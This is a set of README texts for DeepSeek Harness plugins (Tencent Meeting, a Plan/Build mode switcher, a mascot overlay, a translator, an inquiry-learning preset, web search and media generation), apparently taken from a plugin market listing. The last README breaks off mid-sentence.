# 腾讯会议 DSH 插件

标准 Cordis Host 插件/DSH bundle，Node.js 原生实现，无 Python、无安装脚本。不附带任何账号或 Token，不读取原 skill 目录或其 `.env`。

## 安装

```powershell
dsh plugin --profile web add https://github.com/sibetlyf/dsh-plugin-tencent-meeting.git
```

亦可在 DSH 插件页输入本地绝对路径安装。发布后可将路径替换为实际 npm 包名或 Git 仓库地址。当前仅声明兼容 DSH 0.2.1-alpha.1，其他版本需要另行测试，勿绕过兼容性限制。

## 用户手动输入 Token

1. 用户自行访问 https://meeting.tencent.com/ai-skill 获取个人 Token。
2. 打开 DSH 插件设置中的 **腾讯会议**，在 `tokenRef` 对应的凭据输入控件中输入自己的 Token。默认凭据名称为 `DSH_TENCENT_MEETING_TOKEN`。
3. `tokenRef` 配置保存的是引用名称，不是 Token。Token 保存在 DSH 本地凭据服务管理的存储中，不进入插件包、配置补丁或工具参数。
4. 凭据 UI 若在当前版本不可用，可自行设置同名启动环境变量后重启 DSH。不应把 Token 发到聊天。

插件不会自动迁移 `TENCENT_MEETING_TOKEN` 或旧 skill 的 `.env`；使用独立的新引用防止误用旧凭据。没有 Token 仍可安装并查看配置状态；首次真正查询才需要鉴权。

## 使用

加载 `tencent-meeting` skill；调用 `tencent_meeting_discover` 列出动作，传 action 获取官方 inputSchema；`tencent_meeting_call` 执行准确 action 和 arguments。`statusOnly: true` 只返回凭据是否配置，不联网，不返回值。

工具参数按需加载，避免每个模型请求都带上几十个完整远端 schema。官方 schema 由服务端负责参数校验，插件额外检查关键批量限制。HTTP POST 格式沿用原 skill 的官方 JSON-RPC 接口，不假装完成了 Streamable HTTP 协议协商。

## 安全

- 请求只能发往代码内固定的腾讯会议官方 HTTPS 地址，禁止重定向；无自定义 endpoint。
- 每次操作通过 DSH 凭据服务重新读取凭据，不缓存、不输出、不写日志。
- 返回中 Token、授权、密码字段以及当前 Token 明文会脱敏。
- 写入、通讯录及未知操作必须通过 DSH approval；`never` 策略下拒绝，不发送业务请求。确认摘要不得含个人电话、邮箱、内部 ID、Token。
- 录制申请的 prepare/commit、参与者校验及通讯录意图等多步业务约束在 skill 中明确要求；插件并未通过持久状态机器证明模型已执行这些前置步骤。通讯录 meetingIntent 是模型声明，不是意图鉴别器。
- 不自动反馈、更新或重试；网络错误不打印请求头。响应最多 4 MiB、超时最多 120 秒。
- 工具结果可能包含私人会议内容并进入当前会话历史；请保护 DSH 本地数据。

## 开发与发布

```powershell
npm run check
npm test
npm pack --dry-run
npm pack
```

包文件白名单排除 `.env`、测试、缓存、node_modules。图标为本项目原创通用摄像机图形，不是腾讯商标。插件实现及说明重新编写；未复制官方 skill 源码或参考文件。依赖采用 DSH 已提供的 peer package，无 build scripts。

公开源码仓库：https://github.com/sibetlyf/dsh-plugin-tencent-meeting 。尚未发布到 npm；dsh.so 市场收录状态以平台审核结果为准。真实腾讯接口仅在用户手动配置 Token 后验证；自动测试只使用模拟响应，不读取用户秘密。

plugins.description: Plan / Build mode switcher for DeepSeek Harness: a composer dropdown plus a default-mode setting for new sessions.
plugins.readme_text:
# dsh-plan-build-mode

English | [中文](README.zh.md)

A **Plan / Build** mode switcher for [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness) (`dsh`), shaped like opencode's Build/Plan selector.

Two things it adds:

1. **A dropdown in the composer**, sitting immediately to the right of the permission control (`完全权限` / `Full access`). It is always visible and switches the **current** session both ways.
2. **A "Default mode" row in Settings → General**, directly under the permission row. It decides which mode **newly created** sessions start in.

## Why it exists

DSH 0.2.0-rc.2 already ships Plan mode (`@deepseek-ai/dsh-plan-mode`), but the official composer chip `PlanChip` is **exit-only**:

```js
if (!(plan.pending ? !plan.active : plan.active)) return null;
```

When the session is not in Plan mode the chip renders nothing at all, so **the only way into Plan mode is typing `/plan` by hand** — there is no discoverable entry point. This plugin takes the same seat (`conversation.input.plan`) and supplies a two-way dropdown instead.

## Features

- **Always-visible dropdown** showing the current mode (`Build` or `Plan`) with a chevron.
- **Two menu items with a check mark**:
  - **Build** — implement directly (`/plan off`)
  - **Plan** — plan only, no changes executed (`/plan`)
- **Blue highlight** while in Plan mode (uses the official `--dsw-alias-state-business-*` tokens).
- **Optimistic display** — while a switch is in flight (`pending`), the button already shows the target mode.
- **Default mode row** — pick `Build` / `Plan` as the starting mode for new sessions. The current session is unaffected; use the composer control for that.

## Install

Pin the version, so pnpm's release cooldown cannot hand you an older build:

```sh
dsh plugin --profile web add dsh-plan-build-mode@1.1.0
```

Straight from GitHub (no npm publish needed):

```sh
dsh plugin --profile web add github:yzhclcl/dsh-plan-build-mode
```

Desktop app: install from the in-app **Plugins** page. The CLI cannot modify `profiles/desktop`.

Then **fully quit and restart** the process serving the profile. The client bundle revision is derived from file metadata (`mtime`/`ctime`/`size`), so a page refresh alone is not enough — a stale revision makes the browser request a URL the server now 404s, which surfaces as `client-modules: bundle script ... failed to load`.

## Use

**Composer dropdown** — click it, pick `Build` or `Plan`. It maps to the shipped `/plan` and `/plan off` commands, so nothing about the plan-mode machinery changes.

**Default mode** — Settings → General → *Default mode*, under the permission row.

> **Note**: the first time you save this row, `~/.dsh/profiles/<profile>/cordis.patch.yml` gains a top-level entry at the end:
>
> ```yaml
> - id: plan-build-mode
>   name: dsh-plan-build-mode
>   config:
>     defaultMode: plan
>   ```
>
> That is the normal `config-editor` write path. Delete the entry (or set `build`) to go back to the default.

## How it works

| Concern | Approach |
| --- | --- |
| Composer seat | `conversation.input.plan` — the `modes` row of the input bar, adjacent to `conversation.input.permission` |
| Shadowing the official chip | `register({ priority: -1 })` — a `single` slot only rejects *equal* priority; the lowest priority renders |
| Reading state | `useProjection("plan")` → `{ active, pending }` |
| Switching | `ctx.remote.commands.execute(sessionId, "/plan" \| "/plan off", [])` |
| Styles | deduplicated injection via `style[data-plugin-css="dsh-plan-build-mode"]`, reusing official size/colour tokens |
| Settings row seat | `settings.general.item` list slot, `id: "default-mode"`, `order: -10` (permission is `-20`, language is `0`) |
| Settings read/write | `ctx.configForms.get("plan-build-mode")` → `remote.settings.mutate(ns, [{op:"set",path:["defaultMode"],value}], revision)` |
| Config field | `z.union([z.const("build"), z.const("plan")]).default("build").volatile()` — only entries carrying volatile fields reach the settings surface |
| Suppressing the auto form | `ctx.inject(["settings"], (child) => child.effect(() => child.settings.configure({ auto: false }, ctx.fiber)))` |
| Pinning new sessions | On `session/created`, if the session is brand new (`seq === 0`, not seeded, no `parentSession`) and the default is `plan`, append `plan/mode` `{ active: true }` — the same first-party event `@deepseek-ai/dsh-plan-mode` writes, and one of the names on the persisted event allowlist |

### What "Plan mode" actually is

Plan mode is a **soft, prompt-level** guide, not a sandbox. All tools stay available in both modes; the harness injects a `plan:policy` prompt section that tells the model to explore and plan rather than execute. Real restriction comes from the **permission presets** (sandbox mode + approval policy), which are independent and read no plan state. If you want a hard read-only guarantee, switch the permission preset to Read Only.

Switching mid-turn is supported: the intent is queued and applied at the next turn boundary, while the button immediately reflects the target.

## Compatibility

| dsh | Status |
| --- | --- |
| `0.2.0-rc.2` | Verified on Windows, web profile — dropdown, settings row, persistence, and new-session pinning all exercised |

Declared range: `>=0.2.0-0 <0.3.0-0`. The plugin targets the 0.2.x seat layout (`conversation.input.plan`, `settings.general.item`) and the `plan/mode` event, so older 0.1.x hosts are out of scope.

## Uninstall

```sh
dsh plugin --profile web remove dsh-plan-build-mode
```

Restart afterwards. The official `PlanChip` returns to its original behaviour immediately — **this plugin modifies no official file**.

## License

MIT

plugins.description: An unofficial whale-girl companion for the DSH Web GUI: a sidebar brand mark plus a draggable, collapsible floating mascot with live token usage.
plugins.readme_text:
# dsh-agent-whale-girl

An unofficial **whale-girl (鲸鱼娘) companion** for the DeepSeek Harness Web GUI.
She replaces the sidebar brand mark and floats over the page as a draggable,
collapsible mascot: her head follows your cursor, she reacts to pats and clicks,
she follows what the agent is doing, and her speech bubble reports the current
session's real token usage.

![whale-girl](assets/whale-girl-768.webp)

> The character is community fan art, not an official DeepSeek asset — see
> [Source & attribution](#source--attribution). Chinese docs: [README.zh.md](README.zh.md).

## What she does

| Area | Behaviour |
| --- | --- |
| Sidebar brand mark (`sidebar.brand.mark`) | Replaces the stock fish logo with a close-up of her face (`avatar-face.png`). Registered with `priority: -1` so it wins the single-value slot. |
| Floating companion (`shell.overlay`) | A 220×298 paper doll over the frame, with a token card above her and speech bubbles. Drag her anywhere inside the frame (position kept in `localStorage['whale-girl:position']`); double-click returns her to the bottom-right corner and forgets the position; when the window shrinks she is folded back into view. |
| Gaze | Her head turns towards the pointer (up to ±7°) and her tail counter-swings (±4.8°); both settle back to centre 0.22 s after the pointer leaves. The pivot is measured from the eyes/lashes in the art, not from the bounding box. |
| Pat | Press and hold ≥ 350 ms: a one-shot squash-and-return animation plus a dedicated line. She does **not** fold away. |
| Click and combo | A quick click (< 350 ms) folds or unfolds her, with an answering line; 3–4 fast clicks get a counted complaint; the 5th click fires a one-shot easter egg. |
| Mood | `data-mood` follows context occupancy: `<50%` `calm`, `≥50%` `tense`, `≥85%` `crit`. Each crossing drops a 💦 in her corner for 2.6 s. |
| Speech | Lines are triggered by state and filled with real numbers from DSH's own session projections (`tokenUsage`, `contextPressure`): a greeting on mount, an answer on click, live progress while the turn is producing output, a context warning at 80 %, and a "done" line 2.5 s after output stops. She never calls the network or the model. |
| Token card | Context occupancy (bar plus `tokens / window`) and output / input / cache-read counts for the current session — the same projections the composer's own indicator uses. Hidden when there is no session; it yields when the window is narrower than 900 px. |
| Three-layer puppet | Her body, head and tail are separate layers that are pixel-identical to the still illustration at rest, so they are invisible until she moves. |

Animations run only while she is being interacted with: exactly three one-shot
`@keyframes` (`wg-pat` / `wg-egg` / `wg-emote`), no `infinite`, no `alternate`,
no `will-change`; `getAnimations()` is empty when idle.

## Install

The package declares a `dsh.bundle` patch, so installing it mounts both halves —
no profile editing, no manual copy:

```sh
dsh plugin --profile desktop add github:Turanbuturan/dsh-agent-whale-girl
```

`--profile desktop` is the DSH desktop app; use `--profile web` for a plain web
profile. A release tarball or a local checkout works the same way:

```sh
dsh plugin --profile desktop add ./dsh-agent-whale-girl
```

Reload the page afterwards. Host-side changes need a full app restart (Node's ESM
cache pins the module path), but this plugin's host half is empty — a page
refresh is enough.

### Manual drop-in

Copy the folder into `<profile>/plugins/` and add the row to the profile's
`cordis.patch.yml`:

```yaml
- insert:
    - id: whale-girl
      name: "./plugins/dsh-agent-whale-girl/index.js"
```

The path resolves against the profile directory. Removing the `insert` row (and
refreshing) removes her; the folder may stay in place.

### Uninstall

```sh
dsh plugin --profile desktop remove dsh-agent-whale-girl
```

If you used the manual drop-in instead, delete the `insert` row and refresh.

## Build and verify

`lib/client.js` and `lib/client.css` are committed, so installing needs no build
step. To rebuild after changing the art or the skeleton:

```sh
node build.mjs            # regenerates lib/client.js + lib/client.css from the PNGs and layers.json
node verify-bundle.cjs lib/client.js
```

`verify-bundle.cjs` is a structural and behavioural self-check (registrations,
injected CSS, layer geometry, gaze maths, click/pat/combo timing, mood values).
Use absolute paths — the script resolves the bundle relative to the working
directory.

## Files

| File | Purpose |
| --- | --- |
| `package.json` | Declares `dsh.bundle.patch` (installable bundle) and `dsh.client.platform = "web"` (browser half). |
| `index.js` | Host half: an intentionally empty `apply()` so the loader can mount the package. |
| `cordis.patch.yml` | The mount declaration read at install time. |
| `lib/client.js` / `lib/client.css` | Build output: the client bundle that registers both slots, and the stylesheet it injects. |
| `build.mjs` | Builds the two files above from the PNGs and `layers.json` (inlines the art, writes the skeleton geometry into CSS). |
| `layers.json` | Puppet skeleton: crop boxes, rotation origins in the 414×560 art space, amplitudes, measured pivots. |
| `verify-bundle.cjs` | Self-check. |
| `avatar-body.png` / `avatar-head.png` / `avatar-tail.png` | The three puppet layers. |
| `avatar-face.png` | 96×96 face crop used by the 24 px mark and the folded bubble. |
| `avatar.png` | The full-body illustration before cutting. |
| `assets/` | Source art. |

## Source & attribution

The code is MIT. The character art is community fan art and keeps the terms of
the repositories it came from:

- [`Neko3000/deepseek-whalechan`](https://github.com/Neko3000/deepseek-whalechan) — MIT — **the art used now**; cut into layers and background-removed here.
- [`TreapGoGo/deepseek-whale-girl`](https://github.com/TreapGoGo/deepseek-whale-girl) — MIT — the earlier chibi avatar (`assets/whale-girl-avatar-512.png`).
- [`fornarwhal/deepseek-whale-girl-icon`](https://github.com/fornarwhal/deepseek-whale-girl-icon) — custom terms — reviewed as a candidate icon source, not shipped.

See [NOTICE](NOTICE) for the file-by-file mapping. "DeepSeek" and the DeepSeek
whale logo belong to their respective owners; this plugin is an unofficial
community project.

## License

MIT — see [LICENSE](LICENSE).

plugins.description: Live English-to-Chinese translation of model output in the web UI - translation above, original kept aside - with an optional local MT engine and LLM fallback.
plugins.readme_text:
# dsh-en2zh — 模型输出英译中（沉浸式翻译）

把 DSH Web 会话里**模型输出的纯英文内容**（assistant 正文 + 思考/reasoning 块）
自动翻译成中文：**译文在上、原文保留在旁**（弱化为灰色小字）；思考块折叠摘要行
也整体替换为中文（展开后译文 + 原文并列）。

## 翻译范围与跳过规则

| 处理 | 内容 |
|------|------|
| ✅ 翻译 | `assistant-step` 下的 p / li / h1-h6 / blockquote；think 块的 thinkBody 与摘要行 |
| ⛔ 跳过 | 含中文/日文/韩文（中英混杂）、代码块（pre/code）、表格、路径/URL/标识符密集文本、少于 3 个单词的短文本、流式生成中的内容、用户消息、工具卡片 |

- 纯英文判定：无 CJK 字符 + 字母占比 ≥55% + 技术词（含 `/ \ _ : = 扩展名` 等）占比 ≤30%。
- 稳定性双检：文本连续两轮扫描（约 1.5s）指纹不变才送翻，防流式半途文本。
- 译文缓存：sha256 → 中文，落盘 `~/.dsh/en2zh/cache.jsonl`，刷新页面/重复文本零成本秒回。

## 架构

- **host**（`src/host.mjs`，纯 JS 零编译）：`/en2zh/api/{ping,translate}` 路由
  （loopback/trustedHosts 信任围栏，与 side-chat 同源实现）；批量翻译
  （≤5 段/次，`<<#n>>` 分隔协议，解析缺失自动单条回退）；长文本按段落切块（≤3000 字符）。
  模型路由：`agentDefaultModel` 默认选择 → 最近一次主模型调用（`llm/stream` 捕获）→ 第一个可用 provider。
- **client**（`src/client/index.ts` → tsdown → `lib/client.js`）：MutationObserver + 周期扫描，
  状态机（watch/queued/sent/done/skip/failed，失败 30s 冷却重试 ≤3 次），
  译文块插原文旁、React 重渲染自动清理配对节点；右下角「译中 ✓/✗」悬浮开关
  （localStorage 记忆，关闭时全部还原原文显示）。

## 构建 / 注入

```bash
bash scripts/build.sh   # host 直拷 + 借用生态 tsdown 打 client（本机无 dsh 源码 checkout）
# 对 AI 说：dev_inject_plugin {"dir": "<this-plugin-dir>"}
# 改代码后：bash scripts/build.sh && dev_reload_package {"packageName": "dsh-en2zh"}
```

注入后**浏览器刷新一次页面**，client 模块才会加载。

## 调试

- host 日志：`~/.dsh/super-injector/dsh-en2zh.log`
- 路由自检：`curl -X POST http://127.0.0.1:3080/en2zh/api/ping -d '{}' -H 'content-type: application/json'`
- 手工翻译：`curl -X POST http://127.0.0.1:3080/en2zh/api/translate -H 'content-type: application/json' -d '{"items":[{"id":"t1","text":"Hello world, this is a test."}]}'`

plugins.description: 探究模式：把一个概念变成学习者亲手操作的交互式学习任务（DSH agent preset）
plugins.readme_text:
# 探究模式 · Inquiry Mode

简体中文 · [English](README.en.md)

一个 DSH 模式预设：把"有变量可调、有结果可看"的概念，变成一个学习者**亲手操作**的任务。

![探究模式实测：先要一个可证伪的预测，答完才给带滑块的曲线，再让他自己读数](docs/demo.png)

上图是一次真实会话的完整一轮：模型先用普通文字要了**两个可证伪的预测**（"每次动手之前都得先押注，
而且要说出来，心里猜不算"），学习者答完才拿到那张带滑块的实时曲线——整张图只有一个可动的量。
图下的数值表不是装饰：图表渲染失败时它是保底项。

**任务单位是单个交互任务，不是一门课。** 不建课程树、不排进度、不做题库。它是你在某个概念上"想亲手摸一下"时切进去的模式。

---

## 它和已有的东西有什么不同

| | 常见做法 | 探究模式 |
| --- | --- | --- |
| 产物 | 讲解 + 题目 | **一个可以拖的东西** + 一个必须回答的预测 |
| 学习机制 | 看讲解 → 做题 → 判分 | 预测 → 操作 → 观察 → **对质** → 自己说出规律 |
| 结束条件 | 答对 | **他用自己的话说出这个关系** |
| 判分 | LLM 或规则判分 | **不判分**——观察结果是事实，"算不算懂"由他说 |

市场上做"学习模式"的产品几乎都收敛到 **讲解 + 客观题 + 间隔重复**。本预设的差异化在**形态 A：亲手拖出直觉**（下面第 2 节），而不是再做一个刷题器。

---

## 安装

```bash
# 1) 装围栏渲染器（可选，但强烈建议——没有它就拖不动图）
dsh plugin --profile web add @changfenhuang/dsh-genui

# 2) 装本插件
dsh plugin --profile web add github:GrowingPPP/dsh-inquiry-preset
```

把 `web` 换成你实际在用的 profile（桌面端是 `desktop`；不确定就跑 `ls ~/.dsh/profiles`）。

装好后**新建会话**，在模式列表里选 **探究模式**。如果列表里没有它，重启一次 DSH 宿主再看——
插件行的变动有时要重启才进运行中的实例。

### 关于渲染器

它**不是硬依赖**。没有渲染器时 `dsh-ui` 围栏退回普通代码块，任务按 SKILL.md 里写好的降级路径
继续成立（改问数值、列选项、手工算）。

但**形态 A（带参数滑块、拖动即时重绘的函数图）是本产品的旗舰做法**，没有渲染器就用不了。
所以你至少该装一个——任何支持 `dsh-ui` 围栏的渲染插件都行，上面那个是实测过可用的。

**本地开发**：改从仓库目录装 bundle（`plugin_manager install_bundle`，`target` 传本仓库根的绝对路径），
这样改动能直接反映到会话里；换成 `github:` 安装则固定在某个 commit。

---

## 权限与兼容性

**这个预设挂了什么、没挂什么**（都可在 `cordis.patch.yml` 里核对）：

| | 内容 |
| --- | --- |
| 注册的工具 | `skill`（按需加载技能）、`web_search`（联网搜索） |
| **不注册** | 任何 shell、文件读写、子代理、自动化工具 |
| **也不注册** | `web_fetch`（配置里 `fetch: false`，只搜不抓网页） |

也就是说：**装它不会给你的会话开任何新的执行面。** 它改的是"教学行为"，
不是"能做什么"——预设内的工具面比标准模式**更窄**。

**外部服务**：只有 `web_search` 会出去，且发往你自己配置的搜索服务。除此之外不访问任何外部端点。
除非你主动切到别的模式，否则它不会碰你的文件、不会跑命令。

**兼容性**：

- **DSH**：在 **`0.2.1-alpha.2` 和 `0.2.0-rc.2`（官方 `latest`）两个版本上都实测通过**。
  依赖的都是官方包
  （`dsh-persona` / `dsh-skill-filesystem` / `dsh-tool-skill` / `dsh-tool-web` / `dsh-compaction-*`），
  不依赖任何社区插件。

  两个版本之间**逐项比对过我们用到的全部配置面**：`agent-preset` 的 Config 字段、
  `persona.prefix`、`skill-filesystem.customSkillDirs`、`tool-web.fetch`、三个压缩包的 Config、
  以及 `!!js` 求值器（`with (ctx) { return eval(expr) }`）——六项全部同形。

  在 `0.2.0-rc.2` 上做了**完整一份隔离安装**：组装树正确、启动**零告警**、技能发现探针全通过，
  并跑了一轮**真实会话**（模型先要一个可证伪的预测并要求说出推理，然后才给带滑块与虚线参照的曲线图）。

  注：官方 `latest` 是 `0.2.0-rc.2`，而 `0.2.1-alpha.*` 是**更新的一条 alpha 线**，
  两条线的代码并不相同——上面两个都是实测过的。
- **平台**：只在 **macOS + Web profile** 上实测过。其他平台未验证（预设本身是声明式的，理论上可移植）。
- **渲染**：旗舰形态需要一个支持 `dsh-ui` 围栏的渲染插件；没有则降级为纯文字任务。见上一节。
- **已知限制**：
  - 预设的显示名与技能正文是中文
  - 图表组件**可能渲染空白**（实测踩到过两次），所以形态 B 强制配数值表兜底
  - `plot` 的表达式语法很窄：自变量只能叫 `x`、乘法必须写 `*`、参数只能单个字母——
    写错时**什么都不画也不报错**
  - 如果你的 profile 只挂了 `@deepseek-ai/dsh-base`（例如用 `dsh plugin add` 手工建的最小 profile），
    预设会停在 `pending (waiting for service: agentPresets)`——**`agentPresets` 由
    `@deepseek-ai/dsh-web-app` 提供**，`dsh-base` 不含它。正常走 `dsh web` 建出来的 profile
    两个 bundle 都有，不受影响

---

## 怎么用

切到探究模式，说一个你想搞懂的关系：

> 我想搞懂阻尼振动里那个阻尼系数到底在干什么

它应该**先问你一个具体的、可证伪的预测**（"你猜 d 从 0.2 加到 1.5，波形会怎样？"），**然后**才把带滑块的东西给你，最后要你自己说出规律。

如果你发现它一上来就画图、或者直接开始讲解——那是 bug，不是设计。

---

## 设计要点

### 核心循环（`skills/inquiry-task/SKILL.md`）

**预测 → 操作 → 观察 → 对质 → 命名**

其中两条是硬性的：

- **没有预测就没有探究。** 要一个具体的、可证伪的预测，**并且要他说出来**——承诺感来自"在看结果之前必须表态"。说不出预测时，说明缺前置知识，应该回去讲最小必要的那一点，而不是硬给任务。
- **对质不能滑过去。** 猜错了要先问"你按什么推的"，针对那个推理修；直接讲正确结论等于把他刚暴露的错误模型又盖回去了。

### 四种任务形态

| 形态 | 往返 | 用途 |
| --- | --- | --- |
| **A 实时函数探究** | **零** | 旗舰。`plot` 组件自带参数滑块，拖动即时重绘 |
| **B 预计算族** | 零 | 离散/数据类：多序列图、标签页、可本地过滤的表 |
| **C 单点探针** | 一次 | 状态无法用表达式表达时，验证一个具体判断 |
| **D 本地自检** | 零 | 收尾专用，**不做主菜** |

形态 A 能零往返是因为渲染器的 `plot` 组件内建了参数滑块（`params` + 拖动即时重绘 + y 轴锁定 + `animateTo` 动画），不是我们实现的。

### 硬纪律（六条）

1. **绝不等待回合**——渲染完就结束回合，学习者的操作下一轮从正常输入框回来
2. **不剧透**——观察前任何地方不出现结论，包括组件标题和 `explanation` 字段
3. **围栏里只放可操作对象，教学文字放围栏外**（保证降级可读）
4. **没有渲染器就问数值**——降级路径必须始终存在
5. **不硬塞组件**——一段话能讲清就别画图
6. **先讲最小必要概念，再给任务**

`skills/inquiry-task/references/anti-patterns.md` 列了 8 个反模式，前两条（回合空转、剧透）是一票否决级。

### 为什么"不等待"是第一条

这是从一次真实的失败里学到的：**有人真做过交互式学习活动这条路，后来主动砍掉了整条链路**，理由是旧的 `Question → Reveal` 双工具结构"天然重复轮次，并让模型回合在等待用户期间一直处于运行状态"。

围栏是回答的一部分，不是工具调用。模型一旦"等"，回合就挂在运行中直到用户点一下——界面显示在思考，其实在发呆。所以：**渲染完就结束，把回答交还给普通输入框。**

---

## 目录

```
package.json                         dsh-inquiry-preset（bundle 根）
index.js                             入口桩：市场预检要求有入口文件才收
cordis.patch.yml                     预设声明（persona + 4 组子插件）
skills/inquiry-task/
├── SKILL.md                         核心循环 + 硬纪律
└── references/
    ├── task-shapes.md               四形态 + 表达式硬约束 + 降级路径
    └── anti-patterns.md             8 个反模式

tools/probe-skill-dir.mjs            技能被发现链路的逐环探针
docs/demo.png                        上面那张截图
VERIFICATION.md                      实测证据
AGENTS.md                            维护者/AI agent 的工作规范（改这个仓库前先读）
```

排查"技能没出现"时先跑探针——这条链路上任何一环断了都是**静默**的（路径错返回空列表、frontmatter 不合规只打一条 warn）：

```bash
node tools/probe-skill-dir.mjs      # 退出码 0 = 全通过
```

### 两个不能动的约束（改包时容易踩）

1. **不要给 `package.json` 加 `exports` 字段。** 技能目录路径靠
   `createRequire(baseUrl).resolve('dsh-inquiry-preset/package.json')` 解析，而 `exports` 一旦存在，
   子路径访问默认被封锁，会抛 `ERR_PACKAGE_PATH_NOT_EXPORTED`——表现是**技能静默消失**。
   若确实要加，必须同时显式导出 `"./package.json": "./package.json"`。
2. **不要删 `index.js`。** 它从未被 import，但市场装前预检会从包根解析入口文件
   （`exports["."]` → `main` → 兜底 `index.js`），拿不到就判"缺入口文件"并拒收。

---

## 状态

**已在真实会话中实测通过。** 装配层（`preset-inquiry` → `active`、组装树正确）、静态层（技能名与
frontmatter 合规、persona 变量引用全部已注册、内嵌 spec 语法合法）、端到端（技能被加载并影响模型
行为、模型先问预测再给图、`dsh-ui` 围栏渲染成带参数滑块的曲线图）三层全部验过。

首次真实会话测试未发现功能性问题。

详见 [VERIFICATION.md](VERIFICATION.md)。

plugins.description: Web search provider that bridges an OpenAI Responses-API-compatible endpoint with the web_search_preview tool into the dsh web seam.
plugins.readme_text:
# dsh-web-search-duck

Web search provider for the DSH `ctx.web` seam. It bridges any OpenAI **Responses-API-compatible** endpoint that supports the `web_search_preview` tool: the query is sent to the endpoint, and `url_citation` annotations in the response are mapped to a concise answer plus deduplicated sources.

Registers search provider id `duck-responses-search`.

## Configuration

| env | meaning | default |
| --- | --- | --- |
| `DUCK_SEARCH_ENDPOINT` | Responses API endpoint URL | **required** |
| `DUCK_SEARCH_MODEL` | model name sent in the request | **required** |
| `DUCK_SEARCH_CREDENTIAL` | DSH credentials-store key used for `Authorization: Bearer` | `DSH_WEB_SEARCH_TOKEN` |

Without endpoint/model configured the provider throws a clear error instead of guessing.

## Enable

Point the web seam at this provider in your host patch:

```yaml
- id: web
  override:
    searchProvider: duck-responses-search
```

## Install

Install it from the **DSH Plugin Market** (Settings → Plugin Market), or add it to your profile bundle stack manually — see `cordis.patch.yml`. Prebuilt; no build step required.

# dsh-media-gen [English](README.md) | [日本語](README.ja.md) Generate images and videos in DeepSeek Harness (DSH), using the OpenRouter provider and API key already configured in DSH. **Only OpenRouter is supported.** ## Features - Ask the agent to write a model-specific prompt, or send your prompt unchanged through a generation card or command. - Choose models per conversation, use input images, and reuse generated images for image or video generation. - Save results in the working directory (`generated-media/` by default). Video jobs run in the background and notify their originating session. - English and Japanese UI; command responses are English. ## Compatibility Choose a release for your DSH version from [GitHub Releases](https://github.com/so16tm/dsh-media-gen/releases). Supported versions and changes are recorded in [CHANGELOG.md](CHANGELOG.md). ## Installation Replace `` with the full release tag you selected: ```sh dsh plugin --profile web add 'git+https://github.com/so16tm/dsh-media-gen.git#' ``` The repository includes built files, so no local build is needed. It is private: your git must be authenticated with a GitHub account that has access. Replace `web` if you use another profile. To update, run the same `add` command with the new tag and restart DSH. Omitting the tag installs the latest `main`, including unreleased changes; always specify a tag when reinstalling a particular release. To remove: ```sh dsh plugin --profile web remove dsh-media-gen ``` Restart DSH after removal. In DSH's Models settings, add an OpenRouter provider and save its API key. ## Usage

*From a chat request to a generated image, ready to reuse in another image or video. Presentation edited from a user-provided screenshot; the displayed cost is specific to this example.* ### Generation cards and chat Open **Generate…** beside the chat input and choose image/video, model, prompt, and available generation options. - **Ask the agent** lets the agent write or translate your prompt and ask about missing details. - **Generate as written** sends your text unchanged and starts a billable request. Check the displayed estimate first. You can also ask directly in chat. For different image variants, ask for one prompt per image; `/image --count` instead repeats the same prompt. Generated images open in DSH's file preview. **Use for image** and **Use for video** open a card using the image as input (the first frame for video). **Use in chat** inserts its path and replaces the current draft. Ask the agent to save model-specific prompt notes if needed. Notes persist across restarts and apply to all conversations; saving or clearing them always requires approval. ### Commands Place options before the prompt and quote paths containing spaces with `"`. | Command | Purpose | |---|---| | `/image [--model id] [--aspect 1:1] [--resolution 1K] [--count n] [--seed n] [--image path]... [--yes] ` | Generate images; repeat `--image` for multiple inputs | | `/video [--model id] [--duration seconds] [--aspect 16:9] [--resolution 720p] [--audio on\|off] [--seed n] [--first path] [--last path] [--ref path]... [--yes] ` | Submit a video job with optional first/last frames and reference images | | `/media-jobs [job-id]` | List this session's video jobs or check one immediately | | `/media-model` | Show selected models and defaults | | `/media-model image` | List image model IDs | | `/media-model image [provider]` | Select a model for this conversation | | `/media-model image default` | Clear the conversation selection | | `/media-approval on` | Allow generation in this conversation without normal per-request confirmation | | `/media-approval off` | Restore normal per-request confirmation | Use `video` instead of `image` for video model selection. Chat-input selectors do the same thing; selections persist across restarts. The agent prioritizes the conversation selection over its own model argument, then uses configured defaults when no model is specified. Choosing a different card model through **Ask the agent** updates an existing conversation selection. ### Approval and costs Generation costs money. With `requireApproval` enabled and no conversation permission, agent requests ask for approval with the actual prompt and estimated cost; direct commands show only an estimate unless you add `--yes`. The chat input's **Media → Ask before generating** menu also controls conversation permission; only the user can change it. Agent tools always ask before sending images outside the working directory or making a second generation call in the same turn, even if normal confirmation is disabled. Direct commands follow `requireApproval`, `--yes`, and conversation permission instead; these extra agent checks do not apply to them. Estimates may be unknown or lower than the actual bill, especially for input-image or token charges. Required agent approvals still ask when an estimate cannot be obtained. After a timeout or unusable response, the provider may already have charged: check before retrying. If part of a multi-image request fails, already saved images are returned with the failure. ### Video jobs Jobs resume tracking after a DSH restart when storage is available. Completed files are downloaded automatically; completion, failure, or expiry is reported to the session when it is open. Jobs started with `/video` do not wake the agent on completion; use `/media-jobs` or wait for the next agent turn. After `videoMaxWatchMs` (3 hours by default), tracking stops. This does **not** cancel the provider job or guarantee a refund. Ask the agent to check the job with `media_video_status` and its `job_id` to resume tracking. ## Configuration Open **Plugins → Media Generation → Components → Media Generation >** for model defaults, chat-menu models, limits, approval, and notifications. **All models…** can select a model outside your chat-menu filter; the agent can still list all models. | Setting | Default | Purpose | |---|---|---| | `defaultImageProvider` / `defaultImageModel` | unset | Default image provider/model IDs | | `defaultVideoProvider` / `defaultVideoModel` | unset | Default video provider/model IDs | | `chatImageModels` / `chatVideoModels` | `[]` | Chat-menu model IDs; empty shows all | | `maxImagesPerCall` | 4 | Images per call | | `maxVideoSeconds` | 10 | Video duration limit; see Limitations | | `requireApproval` | true | Normal per-generation confirmation | | `outputDir` | `generated-media` | Relative output path within the working directory | | `notifyOnVideoCompletion` | true | Notify the session when a video job ends | For polling, tracking, timeout, cache, and download-size settings, see the [configuration schema](src/index.ts). ## Limitations - Input images are sent to OpenRouter. Only PNG, JPEG, WebP, and GIF up to 20 MiB are accepted, and the model must support the requested input images or frames. API keys are not sent to the browser. - Avoid common output-folder names such as `Pictures`. To display older outputs, the image route also accepts images in matching output folders without distinguishing working directories. - Video previews support mp4, m4v, webm, and mov up to 32 MiB, independently of the download limit. - When duration is omitted, `maxVideoSeconds` can limit the model's default only if its catalog lists supported durations. - Without DSH 